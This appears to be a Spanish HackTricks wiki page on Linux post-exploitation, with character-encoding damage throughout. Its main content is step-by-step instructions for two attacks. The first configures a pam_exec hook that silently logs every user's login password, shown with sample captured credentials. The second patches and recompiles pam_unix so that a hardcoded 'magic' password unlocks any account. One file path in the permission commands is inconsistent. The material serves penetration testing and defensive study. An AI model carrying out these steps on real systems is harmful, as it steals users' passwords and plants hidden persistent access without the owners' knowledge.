# Post-ExplotaciÃ³n de Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Sniffing de contraseÃ±as de inicio de sesiÃ³n con PAM

Vamos a configurar un mÃ³dulo PAM para registrar cada contraseÃ±a que cada usuario utiliza para iniciar sesiÃ³n. Si no sabes quÃ© es PAM, consulta:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

Primero, creamos un script de bash que se invocarÃ¡ cada vez que se produzca una nueva autenticaciÃ³n.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
Las variables son especÃ­ficas de PAM y estarÃ¡n disponibles a travÃ©s del mÃ³dulo `pam_exec.so`.

AquÃ­ estÃ¡ el significado de las variables:

* **$PAM\_USER:** El nombre de usuario que se ingresÃ³.
* **$PAM\_RHOST:** El host remoto (tÃ­picamente la direcciÃ³n IP)
* **$(cat -):** Esto lee `stdin`, y contendrÃ¡ la contraseÃ±a que el script obtiene
* Los resultados se envÃ­an a un archivo de registro en `/var/log/toomanysecrets.log`

Para **evitar que todos los usuarios lean** el archivo, considere pre-crear el archivo y ejecutar `chmod`, por ejemplo:
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
A continuaciÃ³n, se debe actualizar el archivo de configuraciÃ³n de PAM para que el mÃ³dulo `pam_exec` invoque el script.

Existen varios archivos de configuraciÃ³n ubicados en `/etc/pam.d/`, y elegimos `common-auth`.
```
sudo nano /etc/pam.d/common-auth
```
En la parte inferior del archivo, agregue el siguiente mÃ³dulo de autenticaciÃ³n:

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

Los opciones tienen el siguiente significado:

* **optional:** La autenticaciÃ³n no debe fallar si hay un error (no es un paso obligatorio)
* **pam\_exec.so:** Este es el mÃ³dulo PAM que puede invocar scripts arbitrarios
* **expose\_authtok:** Este es el truco que permite leer la contraseÃ±a a travÃ©s de `stdin`
* **quiet:** No mostrar errores al usuario (si algo no funciona)
* El Ãºltimo argumento es el script de shell que se creÃ³ anteriormente

![](<../../.gitbook/assets/image (375).png>)

Finalmente, haga que el archivo sea ejecutable:

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

Ahora, probemos esto y ssh desde otra mÃ¡quina o inicie sesiÃ³n localmente.

Y luego mire el archivo de registro:
```
$ sudo cat /var/log/toomanysecrets.log
 Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
 Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
 Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### Backdooring PAM

Vamos a las fuentes de PAM (depende de tu distribuciÃ³n, toma el mismo nÃºmero de versiÃ³n que la tuya...) y busca alrededor de las lÃ­neas 170/180 en el archivo pam\_unix\_auth.c:
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

Cambiemos esto por:

![](<../../.gitbook/assets/image (638) (2) (2).png>)

Esto permitirÃ¡ que cualquier usuario que use la **contraseÃ±a "0xMitsurugi"** pueda iniciar sesiÃ³n.

Recompila el archivo `pam_unix_auth.c` y reemplaza el archivo pam\_unix.so:
```bash
make
sudo cp \  
  /home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \  
  /lib/x86_64-linux-gnu/security/  
```
{% hint style="info" %}
Puedes automatizar este proceso con [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

## Referencias

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
